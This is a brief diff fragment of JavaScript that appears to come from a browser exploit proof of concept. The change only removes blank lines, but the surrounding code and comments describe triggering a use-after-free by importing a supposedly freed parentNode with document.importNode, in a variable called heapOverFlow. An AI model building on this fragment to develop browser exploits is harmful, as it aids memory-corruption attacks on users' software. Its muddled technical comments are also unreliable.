@@ -74,12 +74,10 @@ var a = canvas;
 
 // point the element to the document itself (that is not yet contained at the page at the given time).
 // so its actually free.
-
 var uafObject = a.parentNode;
 
 // create a new object from the freed object.
 // that still points to the process heap (to the unloaded document).
-
 var heapOverFlow = document.importNode(uafObject,true);
 
 }
